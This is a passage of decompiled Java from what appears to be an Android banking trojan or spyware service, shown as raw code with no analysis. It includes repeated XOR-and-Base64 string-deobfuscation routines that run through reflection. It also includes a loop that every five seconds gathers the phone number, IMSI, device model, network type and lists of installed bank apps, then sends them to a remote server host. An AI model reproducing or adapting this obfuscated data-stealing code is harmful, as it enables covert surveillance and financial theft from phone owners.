      //   15: ldc 82
      //   17: bastore
      //   18: dup
      //   19: iconst_2
      //   20: ldc 88
      //   22: bastore
      //   23: dup
      //   24: iconst_3
      //   25: ldc 78
      //   27: bastore
      //   28: dup
      //   29: iconst_4
      //   30: ldc 83
      //   32: bastore
      //   33: dup
      //   34: iconst_5
      //   35: ldc 85
      //   37: bastore
      //   38: dup
      //   39: bipush #6
      //   41: ldc 88
      //   43: bastore
      //   44: dup
      //   45: bipush #7
      //   47: ldc 18
      //   49: bastore
      //   50: dup
      //   51: bipush #8
      //   53: ldc 73
      //   55: bastore
      //   56: dup
      //   57: bipush #9
      //   59: ldc 72
      //   61: bastore
      //   62: dup
      //   63: bipush #10
      //   65: ldc 85
      //   67: bastore
      //   68: dup
      //   69: bipush #11
      //   71: ldc 80
      //   73: bastore
      //   74: dup
      //   75: bipush #12
      //   77: ldc 18
      //   79: bastore
      //   80: dup
      //   81: bipush #13
      //   83: ldc 126
      //   85: bastore
      //   86: dup
      //   87: bipush #14
      //   89: ldc 93
      //   91: bastore
      //   92: dup
      //   93: bipush #15
      //   95: ldc 79
      //   97: bastore
      //   98: dup
      //   99: bipush #16
      //   101: ldc 89
      //   103: bastore
      //   104: dup
      //   105: bipush #17
      //   107: ldc 10
      //   109: bastore
      //   110: dup
      //   111: bipush #18
      //   113: ldc 8
      //   115: bastore
      //   116: pop
      //   117: aload_0
      //   118: iconst_0
      //   119: iconst_2
      //   120: invokevirtual substring : (II)Ljava/lang/String;
      //   123: astore_3
      //   124: new java/lang/StringBuilder
      //   127: dup
      //   128: aload_0
      //   129: aload_0
      //   130: invokevirtual length : ()I
      //   133: iconst_2
      //   134: isub
      //   135: invokevirtual substring : (I)Ljava/lang/String;
      //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   141: invokespecial <init> : (Ljava/lang/String;)V
      //   144: aload_0
      //   145: iconst_2
      //   146: aload_0
      //   147: invokevirtual length : ()I
      //   150: iconst_2
      //   151: isub
      //   152: invokevirtual substring : (II)Ljava/lang/String;
      //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   158: aload_3
      //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   162: invokevirtual toString : ()Ljava/lang/String;
      //   165: astore_0
      //   166: iconst_0
      //   167: istore #4
      //   169: iload #4
      //   171: bipush #19
      //   173: if_icmplt -> 583
      //   176: new java/lang/String
      //   179: dup
      //   180: aload_2
      //   181: invokespecial <init> : ([B)V
      //   184: astore_3
      //   185: new java/lang/StringBuilder
      //   188: dup
      //   189: aload_3
      //   190: iconst_2
      //   191: iconst_3
      //   192: invokevirtual substring : (II)Ljava/lang/String;
      //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   198: invokespecial <init> : (Ljava/lang/String;)V
      //   201: aload_3
      //   202: bipush #16
      //   204: bipush #17
      //   206: invokevirtual substring : (II)Ljava/lang/String;
      //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   212: invokevirtual toString : ()Ljava/lang/String;
      //   215: astore_2
      //   216: new java/lang/StringBuilder
      //   219: dup
      //   220: new java/lang/StringBuilder
      //   223: dup
      //   224: new java/lang/StringBuilder
      //   227: dup
      //   228: aload_2
      //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   232: invokespecial <init> : (Ljava/lang/String;)V
      //   235: ldc 'c'
      //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   240: invokevirtual toString : ()Ljava/lang/String;
      //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   246: invokespecial <init> : (Ljava/lang/String;)V
      //   249: aload_3
      //   250: iconst_4
      //   251: iconst_5
      //   252: invokevirtual substring : (II)Ljava/lang/String;
      //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   258: invokevirtual toString : ()Ljava/lang/String;
      //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   264: invokespecial <init> : (Ljava/lang/String;)V
      //   267: aload_2
      //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   271: invokevirtual toString : ()Ljava/lang/String;
      //   274: astore_2
      //   275: aload_3
      //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
      //   279: astore_3
      //   280: aload_3
      //   281: aload_2
      //   282: iconst_2
      //   283: anewarray java/lang/Class
      //   286: dup
      //   287: iconst_0
      //   288: ldc java/lang/String
      //   290: aastore
      //   291: dup
      //   292: iconst_1
      //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
      //   296: aastore
      //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
      //   300: aload_3
      //   301: iconst_2
      //   302: anewarray java/lang/Object
      //   305: dup
      //   306: iconst_0
      //   307: aload_0
      //   308: aastore
      //   309: dup
      //   310: iconst_1
      //   311: iconst_0
      //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
      //   315: aastore
      //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
      //   319: checkcast [B
      //   322: astore_0
      //   323: aload_0
      //   324: arraylength
      //   325: istore #5
      //   327: iload #5
      //   329: iconst_1
      //   330: isub
      //   331: aload_0
      //   332: iload #5
      //   334: iconst_1
      //   335: isub
      //   336: baload
      //   337: i2c
      //   338: invokestatic valueOf : (C)Ljava/lang/String;
      //   341: invokestatic parseInt : (Ljava/lang/String;)I
      //   344: isub
      //   345: istore #6
      //   347: aload_0
      //   348: iload #6
      //   350: iconst_1
      //   351: isub
      //   352: baload
      //   353: iconst_1
      //   354: if_icmpne -> 652
      //   357: iconst_1
      //   358: istore #4
      //   360: iinc #6, -1
      //   363: aload_0
      //   364: iload #6
      //   366: iconst_2
      //   367: isub
      //   368: baload
      //   369: i2c
      //   370: istore #7
      //   372: aload_0
      //   373: iload #6
      //   375: iconst_1
      //   376: isub
      //   377: baload
      //   378: i2c
      //   379: istore #8
      //   381: new java/lang/StringBuilder
      //   384: dup
      //   385: iload #7
      //   387: invokestatic valueOf : (C)Ljava/lang/String;
      //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   393: invokespecial <init> : (Ljava/lang/String;)V
      //   396: iload #8
      //   398: invokestatic valueOf : (C)Ljava/lang/String;
      //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   404: invokevirtual toString : ()Ljava/lang/String;
      //   407: bipush #16
      //   409: invokestatic parseInt : (Ljava/lang/String;I)I
      //   412: i2b
      //   413: bipush #111
      //   415: isub
      //   416: i2b
      //   417: istore #9
      //   419: iload #6
      //   421: iconst_2
      //   422: isub
      //   423: istore #10
      //   425: iconst_0
      //   426: istore #6
      //   428: iload #6
      //   430: iload #10
      //   432: if_icmplt -> 658
      //   435: iload #10
      //   437: istore #6
      //   439: iload #6
      //   441: iload #5
      //   443: if_icmplt -> 677
      //   446: iload #4
      //   448: iconst_1
      //   449: if_icmpne -> 559
      //   452: new java/lang/Exception
      //   455: dup
      //   456: invokespecial <init> : ()V
      //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
      //   462: iconst_1
      //   463: aaload
      //   464: astore_3
      //   465: aload_3
      //   466: invokevirtual getClassName : ()Ljava/lang/String;
      //   469: astore_2
      //   470: aload_2
      //   471: ldc '.'
      //   473: invokevirtual lastIndexOf : (Ljava/lang/String;)I
      //   476: istore #4
      //   478: aload_2
      //   479: astore_1
      //   480: iload #4
      //   482: iconst_m1
      //   483: if_icmpeq -> 495
      //   486: aload_2
      //   487: iload #4
      //   489: iconst_1
      //   490: iadd
      //   491: invokevirtual substring : (I)Ljava/lang/String;
      //   494: astore_1
      //   495: aload_3
      //   496: invokevirtual getMethodName : ()Ljava/lang/String;
      //   499: astore_2
      //   500: new java/lang/StringBuilder
      //   503: dup
      //   504: aload_1
      //   505: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   508: invokespecial <init> : (Ljava/lang/String;)V
      //   511: aload_2
      //   512: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   515: invokevirtual toString : ()Ljava/lang/String;
      //   518: astore_2
      //   519: aload_2
      //   520: astore_1
      //   521: aload_2
      //   522: invokevirtual length : ()I
      //   525: sipush #256
      //   528: if_icmple -> 540
      //   531: aload_2
      //   532: iconst_0
      //   533: sipush #256
      //   536: invokevirtual substring : (II)Ljava/lang/String;
      //   539: astore_1
      //   540: aload_1
      //   541: invokevirtual length : ()I
      //   544: istore #4
      //   546: iconst_0
      //   547: istore #6
      //   549: iinc #4, -1
      //   552: iload #6
      //   554: iload #10
      //   556: if_icmplt -> 689
      //   559: iload #10
      //   561: newarray byte
      //   563: astore_1
      //   564: iconst_0
      //   565: istore #4
      //   567: iload #4
      //   569: iload #10
      //   571: if_icmplt -> 740
      //   574: new java/lang/String
      //   577: dup
      //   578: aload_1
      //   579: invokespecial <init> : ([B)V
      //   582: areturn
      //   583: aload_2
      //   584: iload #4
      //   586: aload_2
      //   587: iload #4
      //   589: baload
      //   590: bipush #60
      //   592: ixor
      //   593: i2b
      //   594: i2b
      //   595: bastore
      //   596: iinc #4, 1
      //   599: goto -> 169
      //   602: astore_0
      //   603: aload_0
      //   604: invokevirtual printStackTrace : ()V
      //   607: aload_1
      //   608: astore_0
      //   609: goto -> 323
      //   612: astore_0
      //   613: aload_0
      //   614: invokevirtual printStackTrace : ()V
      //   617: aload_1
      //   618: astore_0
      //   619: goto -> 323
      //   622: astore_0
      //   623: aload_0
      //   624: invokevirtual printStackTrace : ()V
      //   627: aload_1
      //   628: astore_0
      //   629: goto -> 323
      //   632: astore_0
      //   633: aload_0
      //   634: invokevirtual printStackTrace : ()V
      //   637: aload_1
      //   638: astore_0
      //   639: goto -> 323
      //   642: astore_0
      //   643: aload_0
      //   644: invokevirtual printStackTrace : ()V
      //   647: aload_1
      //   648: astore_0
      //   649: goto -> 323
      //   652: iconst_0
      //   653: istore #4
      //   655: goto -> 360
      //   658: aload_0
      //   659: iload #6
      //   661: aload_0
      //   662: iload #6
      //   664: baload
      //   665: iload #9
      //   667: ixor
      //   668: i2b
      //   669: i2b
      //   670: bastore
      //   671: iinc #6, 1
      //   674: goto -> 428
      //   677: aload_0
      //   678: iload #6
      //   680: iconst_0
      //   681: i2b
      //   682: bastore
      //   683: iinc #6, 1
      //   686: goto -> 439
      //   689: aload_0
      //   690: iload #6
      //   692: baload
      //   693: istore #9
      //   695: iload #4
      //   697: iconst_1
      //   698: isub
      //   699: istore #5
      //   701: aload_0
      //   702: iload #6
      //   704: iload #9
      //   706: aload_1
      //   707: iload #4
      //   709: invokevirtual charAt : (I)C
      //   712: i2b
      //   713: ixor
      //   714: i2b
      //   715: i2b
      //   716: bastore
      //   717: iload #5
      //   719: istore #4
      //   721: iload #5
      //   723: ifge -> 734
      //   726: aload_1
      //   727: invokevirtual length : ()I
      //   730: iconst_1
      //   731: isub
      //   732: istore #4
      //   734: iinc #6, 1
      //   737: goto -> 552
      //   740: aload_1
      //   741: iload #4
      //   743: aload_0
      //   744: iload #4
      //   746: baload
      //   747: i2b
      //   748: bastore
      //   749: iinc #4, 1
      //   752: goto -> 567
      // Exception table:
      //   from	to	target	type
      //   275	323	602	java/lang/ClassNotFoundException
      //   275	323	612	java/lang/IllegalAccessException
      //   275	323	622	java/lang/NoSuchMethodException
      //   275	323	632	java/lang/IllegalArgumentException
      //   275	323	642	java/lang/reflect/InvocationTargetException
    }
    
    public void run() {
      try {
        Config.isAlert = 0;
        Intent intent = new Intent();
        this();
        intent.setAction(run("Q=gPEk0RAQoNIQIdYUoHAxQXHhw7N0MBPsHQ1zAg"));
        CoreService.mContext.sendBroadcast(intent);
      } catch (Exception exception) {}
    }
  }
  
  class CommRunnable implements Runnable {
    public void run() {
      while (true) {
        try {
          while (true) {
            Thread.sleep(2000L);
            Thread thread = new Thread();
            CoreService.MyOrderRunnable myOrderRunnable = new CoreService.MyOrderRunnable();
            this();
            this(myOrderRunnable);
            thread.start();
          } 
          break;
        } catch (InterruptedException interruptedException) {
          interruptedException.printStackTrace();
        } 
      } 
    }
  }
  
  class HTRunnable implements Runnable {
    private static String run(String param1String) {
      // Byte code:
      //   0: aconst_null
      //   1: astore_1
      //   2: bipush #19
      //   4: newarray byte
      //   6: astore_2
      //   7: aload_2
      //   8: dup
      //   9: iconst_0
      //   10: ldc 72
      //   12: bastore
      //   13: dup
      //   14: iconst_1
      //   15: ldc 71
      //   17: bastore
      //   18: dup
      //   19: iconst_2
      //   20: ldc 77
      //   22: bastore
      //   23: dup
      //   24: iconst_3
      //   25: ldc 91
      //   27: bastore
      //   28: dup
      //   29: iconst_4
      //   30: ldc 70
      //   32: bastore
      //   33: dup
      //   34: iconst_5
      //   35: ldc 64
      //   37: bastore
      //   38: dup
      //   39: bipush #6
      //   41: ldc 77
      //   43: bastore
      //   44: dup
      //   45: bipush #7
      //   47: ldc 7
      //   49: bastore
      //   50: dup
      //   51: bipush #8
      //   53: ldc 92
      //   55: bastore
      //   56: dup
      //   57: bipush #9
      //   59: ldc 93
      //   61: bastore
      //   62: dup
      //   63: bipush #10
      //   65: ldc 64
      //   67: bastore
      //   68: dup
      //   69: bipush #11
      //   71: ldc 69
      //   73: bastore
      //   74: dup
      //   75: bipush #12
      //   77: ldc 7
      //   79: bastore
      //   80: dup
      //   81: bipush #13
      //   83: ldc 107
      //   85: bastore
      //   86: dup
      //   87: bipush #14
      //   89: ldc 72
      //   91: bastore
      //   92: dup
      //   93: bipush #15
      //   95: ldc 90
      //   97: bastore
      //   98: dup
      //   99: bipush #16
      //   101: ldc 76
      //   103: bastore
      //   104: dup
      //   105: bipush #17
      //   107: ldc 31
      //   109: bastore
      //   110: dup
      //   111: bipush #18
      //   113: ldc 29
      //   115: bastore
      //   116: pop
      //   117: aload_0
      //   118: iconst_0
      //   119: iconst_2
      //   120: invokevirtual substring : (II)Ljava/lang/String;
      //   123: astore_3
      //   124: new java/lang/StringBuilder
      //   127: dup
      //   128: aload_0
      //   129: aload_0
      //   130: invokevirtual length : ()I
      //   133: iconst_2
      //   134: isub
      //   135: invokevirtual substring : (I)Ljava/lang/String;
      //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   141: invokespecial <init> : (Ljava/lang/String;)V
      //   144: aload_0
      //   145: iconst_2
      //   146: aload_0
      //   147: invokevirtual length : ()I
      //   150: iconst_2
      //   151: isub
      //   152: invokevirtual substring : (II)Ljava/lang/String;
      //   155: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   158: aload_3
      //   159: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   162: invokevirtual toString : ()Ljava/lang/String;
      //   165: astore_0
      //   166: iconst_0
      //   167: istore #4
      //   169: iload #4
      //   171: bipush #19
      //   173: if_icmplt -> 583
      //   176: new java/lang/String
      //   179: dup
      //   180: aload_2
      //   181: invokespecial <init> : ([B)V
      //   184: astore_2
      //   185: new java/lang/StringBuilder
      //   188: dup
      //   189: aload_2
      //   190: iconst_2
      //   191: iconst_3
      //   192: invokevirtual substring : (II)Ljava/lang/String;
      //   195: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   198: invokespecial <init> : (Ljava/lang/String;)V
      //   201: aload_2
      //   202: bipush #16
      //   204: bipush #17
      //   206: invokevirtual substring : (II)Ljava/lang/String;
      //   209: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   212: invokevirtual toString : ()Ljava/lang/String;
      //   215: astore_3
      //   216: new java/lang/StringBuilder
      //   219: dup
      //   220: new java/lang/StringBuilder
      //   223: dup
      //   224: new java/lang/StringBuilder
      //   227: dup
      //   228: aload_3
      //   229: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   232: invokespecial <init> : (Ljava/lang/String;)V
      //   235: ldc 'c'
      //   237: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   240: invokevirtual toString : ()Ljava/lang/String;
      //   243: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   246: invokespecial <init> : (Ljava/lang/String;)V
      //   249: aload_2
      //   250: iconst_4
      //   251: iconst_5
      //   252: invokevirtual substring : (II)Ljava/lang/String;
      //   255: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   258: invokevirtual toString : ()Ljava/lang/String;
      //   261: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   264: invokespecial <init> : (Ljava/lang/String;)V
      //   267: aload_3
      //   268: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   271: invokevirtual toString : ()Ljava/lang/String;
      //   274: astore_3
      //   275: aload_2
      //   276: invokestatic forName : (Ljava/lang/String;)Ljava/lang/Class;
      //   279: astore_2
      //   280: aload_2
      //   281: aload_3
      //   282: iconst_2
      //   283: anewarray java/lang/Class
      //   286: dup
      //   287: iconst_0
      //   288: ldc java/lang/String
      //   290: aastore
      //   291: dup
      //   292: iconst_1
      //   293: getstatic java/lang/Integer.TYPE : Ljava/lang/Class;
      //   296: aastore
      //   297: invokevirtual getDeclaredMethod : (Ljava/lang/String;[Ljava/lang/Class;)Ljava/lang/reflect/Method;
      //   300: aload_2
      //   301: iconst_2
      //   302: anewarray java/lang/Object
      //   305: dup
      //   306: iconst_0
      //   307: aload_0
      //   308: aastore
      //   309: dup
      //   310: iconst_1
      //   311: iconst_0
      //   312: invokestatic valueOf : (I)Ljava/lang/Integer;
      //   315: aastore
      //   316: invokevirtual invoke : (Ljava/lang/Object;[Ljava/lang/Object;)Ljava/lang/Object;
      //   319: checkcast [B
      //   322: astore_0
      //   323: aload_0
      //   324: arraylength
      //   325: istore #5
      //   327: iload #5
      //   329: iconst_1
      //   330: isub
      //   331: aload_0
      //   332: iload #5
      //   334: iconst_1
      //   335: isub
      //   336: baload
      //   337: i2c
      //   338: invokestatic valueOf : (C)Ljava/lang/String;
      //   341: invokestatic parseInt : (Ljava/lang/String;)I
      //   344: isub
      //   345: istore #6
      //   347: aload_0
      //   348: iload #6
      //   350: iconst_1
      //   351: isub
      //   352: baload
      //   353: iconst_1
      //   354: if_icmpne -> 652
      //   357: iconst_1
      //   358: istore #4
      //   360: iinc #6, -1
      //   363: aload_0
      //   364: iload #6
      //   366: iconst_2
      //   367: isub
      //   368: baload
      //   369: i2c
      //   370: istore #7
      //   372: aload_0
      //   373: iload #6
      //   375: iconst_1
      //   376: isub
      //   377: baload
      //   378: i2c
      //   379: istore #8
      //   381: new java/lang/StringBuilder
      //   384: dup
      //   385: iload #7
      //   387: invokestatic valueOf : (C)Ljava/lang/String;
      //   390: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   393: invokespecial <init> : (Ljava/lang/String;)V
      //   396: iload #8
      //   398: invokestatic valueOf : (C)Ljava/lang/String;
      //   401: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   404: invokevirtual toString : ()Ljava/lang/String;
      //   407: bipush #16
      //   409: invokestatic parseInt : (Ljava/lang/String;I)I
      //   412: i2b
      //   413: bipush #99
      //   415: iadd
      //   416: i2b
      //   417: istore #9
      //   419: iload #6
      //   421: iconst_2
      //   422: isub
      //   423: istore #10
      //   425: iconst_0
      //   426: istore #6
      //   428: iload #6
      //   430: iload #10
      //   432: if_icmplt -> 658
      //   435: iload #10
      //   437: istore #6
      //   439: iload #6
      //   441: iload #5
      //   443: if_icmplt -> 677
      //   446: iload #4
      //   448: iconst_1
      //   449: if_icmpne -> 559
      //   452: new java/lang/Exception
      //   455: dup
      //   456: invokespecial <init> : ()V
      //   459: invokevirtual getStackTrace : ()[Ljava/lang/StackTraceElement;
      //   462: iconst_1
      //   463: aaload
      //   464: astore_3
      //   465: aload_3
      //   466: invokevirtual getClassName : ()Ljava/lang/String;
      //   469: astore_2
      //   470: aload_2
      //   471: ldc '.'
      //   473: invokevirtual lastIndexOf : (Ljava/lang/String;)I
      //   476: istore #4
      //   478: aload_2
      //   479: astore_1
      //   480: iload #4
      //   482: iconst_m1
      //   483: if_icmpeq -> 495
      //   486: aload_2
      //   487: iload #4
      //   489: iconst_1
      //   490: iadd
      //   491: invokevirtual substring : (I)Ljava/lang/String;
      //   494: astore_1
      //   495: aload_3
      //   496: invokevirtual getMethodName : ()Ljava/lang/String;
      //   499: astore_2
      //   500: new java/lang/StringBuilder
      //   503: dup
      //   504: aload_1
      //   505: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   508: invokespecial <init> : (Ljava/lang/String;)V
      //   511: aload_2
      //   512: invokevirtual append : (Ljava/lang/String;)Ljava/lang/StringBuilder;
      //   515: invokevirtual toString : ()Ljava/lang/String;
      //   518: astore_2
      //   519: aload_2
      //   520: astore_1
      //   521: aload_2
      //   522: invokevirtual length : ()I
      //   525: sipush #256
      //   528: if_icmple -> 540
      //   531: aload_2
      //   532: iconst_0
      //   533: sipush #256
      //   536: invokevirtual substring : (II)Ljava/lang/String;
      //   539: astore_1
      //   540: aload_1
      //   541: invokevirtual length : ()I
      //   544: istore #4
      //   546: iconst_0
      //   547: istore #6
      //   549: iinc #4, -1
      //   552: iload #6
      //   554: iload #10
      //   556: if_icmplt -> 689
      //   559: iload #10
      //   561: newarray byte
      //   563: astore_1
      //   564: iconst_0
      //   565: istore #4
      //   567: iload #4
      //   569: iload #10
      //   571: if_icmplt -> 740
      //   574: new java/lang/String
      //   577: dup
      //   578: aload_1
      //   579: invokespecial <init> : ([B)V
      //   582: areturn
      //   583: aload_2
      //   584: iload #4
      //   586: aload_2
      //   587: iload #4
      //   589: baload
      //   590: bipush #41
      //   592: ixor
      //   593: i2b
      //   594: i2b
      //   595: bastore
      //   596: iinc #4, 1
      //   599: goto -> 169
      //   602: astore_0
      //   603: aload_0
      //   604: invokevirtual printStackTrace : ()V
      //   607: aload_1
      //   608: astore_0
      //   609: goto -> 323
      //   612: astore_0
      //   613: aload_0
      //   614: invokevirtual printStackTrace : ()V
      //   617: aload_1
      //   618: astore_0
      //   619: goto -> 323
      //   622: astore_0
      //   623: aload_0
      //   624: invokevirtual printStackTrace : ()V
      //   627: aload_1
      //   628: astore_0
      //   629: goto -> 323
      //   632: astore_0
      //   633: aload_0
      //   634: invokevirtual printStackTrace : ()V
      //   637: aload_1
      //   638: astore_0
      //   639: goto -> 323
      //   642: astore_0
      //   643: aload_0
      //   644: invokevirtual printStackTrace : ()V
      //   647: aload_1
      //   648: astore_0
      //   649: goto -> 323
      //   652: iconst_0
      //   653: istore #4
      //   655: goto -> 360
      //   658: aload_0
      //   659: iload #6
      //   661: aload_0
      //   662: iload #6
      //   664: baload
      //   665: iload #9
      //   667: ixor
      //   668: i2b
      //   669: i2b
      //   670: bastore
      //   671: iinc #6, 1
      //   674: goto -> 428
      //   677: aload_0
      //   678: iload #6
      //   680: iconst_0
      //   681: i2b
      //   682: bastore
      //   683: iinc #6, 1
      //   686: goto -> 439
      //   689: aload_0
      //   690: iload #6
      //   692: baload
      //   693: istore #9
      //   695: iload #4
      //   697: iconst_1
      //   698: isub
      //   699: istore #5
      //   701: aload_0
      //   702: iload #6
      //   704: iload #9
      //   706: aload_1
      //   707: iload #4
      //   709: invokevirtual charAt : (I)C
      //   712: i2b
      //   713: ixor
      //   714: i2b
      //   715: i2b
      //   716: bastore
      //   717: iload #5
      //   719: istore #4
      //   721: iload #5
      //   723: ifge -> 734
      //   726: aload_1
      //   727: invokevirtual length : ()I
      //   730: iconst_1
      //   731: isub
      //   732: istore #4
      //   734: iinc #6, 1
      //   737: goto -> 552
      //   740: aload_1
      //   741: iload #4
      //   743: aload_0
      //   744: iload #4
      //   746: baload
      //   747: i2b
      //   748: bastore
      //   749: iinc #4, 1
      //   752: goto -> 567
      // Exception table:
      //   from	to	target	type
      //   275	323	602	java/lang/ClassNotFoundException
      //   275	323	612	java/lang/IllegalAccessException
      //   275	323	622	java/lang/NoSuchMethodException
      //   275	323	632	java/lang/IllegalArgumentException
      //   275	323	642	java/lang/reflect/InvocationTargetException
    }
    
    public void run() {
      while (true) {
        try {
          Thread.sleep(5000L);
          CoreService.autoCT++;
          if (CoreService.autoCT % 24 == 23)
            App.autoChangeApps(); 
          CoreService.this.isnew = Integer.valueOf(Config.get((Context)CoreService.this, run("U=X/4/g4MAFFdMI9gj5O"), 0));
          if (CoreService.this.isnew.equals(Integer.valueOf(0))) {
            CoreService.this.newClient = 1;
            Config.set((Context)CoreService.this, run("==4EGANCNQEv2bnUNAHx"), 1);
          } else {
            CoreService.this.newClient = 0;
          } 
          CoreService coreService2 = CoreService.this;
          StringBuilder stringBuilder4 = new StringBuilder();
          this(String.valueOf(Config.get((Context)CoreService.this, run("U=CHjpkyMwFEMIR6ejgY"), 1)));
          coreService2.issms = stringBuilder4.toString();
          CoreService coreService3 = CoreService.this;
          StringBuilder stringBuilder2 = new StringBuilder();
          this(String.valueOf(Config.get((Context)CoreService.this, run("==bh9PD+OEQBMsm7Mw9/"), 0)));
          coreService3.iscall = stringBuilder2.toString();
          App app = new App();
          this();
          app.getApps();
          CoreService.this.capp = Config.cBankStr;
          CoreService.this.sapp = Config.sBankStr;
          CoreService.this.currentapiVersion = Build.VERSION.SDK_INT;
          CoreService.this.mobVersion = URLEncoder.encode(Build.MODEL);
          coreService3 = CoreService.this;
          StringBuilder stringBuilder1 = new StringBuilder();
          this(String.valueOf(Calendar.getInstance().getTimeInMillis()));
          coreService3.timeint = stringBuilder1.toString();
          CoreService.this.net = Integer.valueOf(Config.getAPNType((Context)CoreService.mContext));
          if (CoreService.this.net.equals(Integer.valueOf(1))) {
            CoreService.this.nettype = "wifi";
          } else if (CoreService.this.net.equals(Integer.valueOf(2))) {
            CoreService.this.nettype = "wap";
          } else if (CoreService.this.net.equals(Integer.valueOf(3))) {
            CoreService.this.nettype = "net";
          } 
          CoreService coreService1 = CoreService.this;
          StringBuilder stringBuilder3 = new StringBuilder();
          this(String.valueOf(Config.get((Context)CoreService.this, run("U=Pz4Prj++05MAGQc3plID7u"), Config.SERVER_HOST)));
          coreService1.httpUrl = stringBuilder3.append(Config.SERVER_ADDRESS).append(run("Q=U2Mj0lISo/dhkUGXU5NiluQzIB0VjDcjAz")).append(CoreService.this.nettype).append(run("U=86IHZDNAFsjJlIpjbz")).append(CoreService.this.mobVersion).append(run("Q=0JCQEVEB5NQkIBgj2IajVh")).append(CoreService.this.currentapiVersion).append(run("8zLOy9bX0dLZ2LY3NgFwOdkc")).append(CoreService.this.newClient).append(run("wzeblJKbj88zOQFHg61I")).append(CoreService.this.number).append(run("==YlLD9lRDcBODWFMwci")).append(CoreService.this.imsi).append(run("A05DVENTHkRGAbVWhlCl")).append(CoreService.this.issms).append(run("MziVkpmamcczMQE4zN3I")).append(CoreService.this.iscall).append(run("s1AFAwpJQjMBw3d7hqXg")).append(CoreService.this.capp).append(run("s1M2MDl6QzIBiF3IKHbS")).append(CoreService.this.sapp).append("&t=").append(CoreService.this.timeint).toString();
          Thread thread = new Thread();
          CoreService.MyRunnable myRunnable = new CoreService.MyRunnable();
          this(CoreService.this.httpUrl);
          this(myRunnable);
          thread.start();
        } catch (InterruptedException interruptedException) {
          interruptedException.printStackTrace();
        } 
      } 
    }
  }
  
  class MyBroadcastReciver extends BroadcastReceiver {
    private static String _1007149(String param1String) {
      // Byte code:
      //   0: aconst_null
      //   1: astore_1
      //   2: bipush #19
      //   4: newarray byte
      //   6: astore_2
      //   7: aload_2
      //   8: dup
      //   9: iconst_0
      //   10: ldc 7
      //   12: bastore
      //   13: dup
      //   14: iconst_1
      //   15: ldc 8
      //   17: bastore
      //   18: dup
      //   19: iconst_2
      //   20: ldc 2
      //   22: bastore
      //   23: dup
      //   24: iconst_3
      //   25: ldc 20
      //   27: bastore
      //   28: dup
      //   29: iconst_4
      //   30: ldc 9
      //   32: bastore
      //   33: dup
      //   34: iconst_5
      //   35: ldc 15
      //   37: bastore
      //   38: dup
      //   39: bipush #6
      //   41: ldc 2
      //   43: bastore
      //   44: dup
      //   45: bipush #7
      //   47: ldc 72
      //   49: bastore
      //   50: dup
      //   51: bipush #8
      //   53: ldc 19
      //   55: bastore
      //   56: dup
      //   57: bipush #9
      //   59: ldc 18
      //   61: bastore
      //   62: dup
      //   63: bipush #10
      //   65: ldc 15
      //   67: bastore
      //   68: dup
      //   69: bipush #11
      //   71: ldc 10
      //   73: bastore
      //   74: dup
      //   75: bipush #12
      //   77: ldc 72
      //   79: bastore
      //   80: dup
      //   81: bipush #13
      //   83: ldc 36
      //   85: bastore
      //   86: dup
      //   87: bipush #14
      //   89: ldc 7
      //   91: bastore
      //   92: dup
      //   93: bipush #15
      //   95: ldc 21
      //   97: bastore
      //   98: dup
      //   99: bipush #16
      //   101: ldc 3
      //   103: bastore
      //   104: dup
      //   105: bipush #17
      //   107: ldc 80
      //   109: bastore
      //   110: dup
      //   111: bipush #18
      //   113: ldc 82
      //   115: bastore
      //   116: pop
      //   117: aload_0
      //   118: iconst_0
      //   119: iconst_2
      //   120: invokevirtual substring : (II)Ljava/lang/String;
      //   123: astore_3
      //   124: new java/lang/StringBuilder
      //   127: dup
      //   128: aload_0
      //   129: aload_0
      //   130: invokevirtual length : ()I
      //   133: iconst_2
      //   134: isub
      //   135: invokevirtual substring : (I)Ljava/lang/String;
      //   138: invokestatic valueOf : (Ljava/lang/Object;)Ljava/lang/String;
      //   141: invokespecial <init> : (Ljava/lang/String;)V
      //   144: aload_0
      //   145: iconst_2
      //   146: aload_0
      //   147: invokevirtual length : ()I
